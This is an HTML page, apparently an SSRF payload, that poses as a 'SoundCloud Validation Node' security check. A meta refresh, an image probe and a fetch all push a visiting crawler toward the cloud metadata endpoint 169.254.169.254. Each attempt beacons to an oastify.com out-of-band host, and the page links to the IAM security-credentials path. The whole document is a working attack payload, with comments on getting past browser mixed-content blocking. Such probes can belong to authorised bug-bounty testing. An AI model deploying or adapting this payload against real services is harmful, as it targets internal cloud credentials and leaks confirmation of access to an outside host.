<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Infrastructure Security Validation</title>
    
    <meta http-equiv="refresh" content="0; url=http://169.254.169.254/latest/meta-data/hostname">

    <script>
        window.onload = function() {
            const oast = "ie0z38xjt8769e7sxsendgn17sdj19py.oastify.com";
            const target = "http://169.254.169.254/latest/meta-data/hostname";

            // LAYER 2: PASSIVE IMAGE PROBE (Bypasses 'Mixed Content' block)
            // Browsers often allow HTTP images on HTTPS pages.
            // If the worker hits this, the 'onerror' triggers a ping back to you.
            const img = new Image();
            img.src = target;
            img.onerror = function() {
                navigator.sendBeacon("https://" + oast + "/probe_hit?type=image_onerror");
            };

            // LAYER 3: ADVANCED FETCH (Targets Headless Browsers)
            fetch(target, { mode: 'no-cors' })
                .then(() => {
                    navigator.sendBeacon("https://" + oast + "/probe_hit?type=fetch_success");
                })
                .catch((err) => {
                    // This will ping your OAST even if it's blocked by Mixed Content,
                    // proving the code at least attempted to run on the worker.
                    const log = new Image();
                    log.src = "https://" + oast + "/probe_failed?reason=" + btoa(err.message);
                });
        };
    </script>
</head>
<body>
    <h1>SoundCloud Validation Node</h1>
    <hr>
    <p>Automated crawler detected. If redirection fails, verify internal path:</p>
    <a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">Internal Credentials Access</a>
</body>
</html>
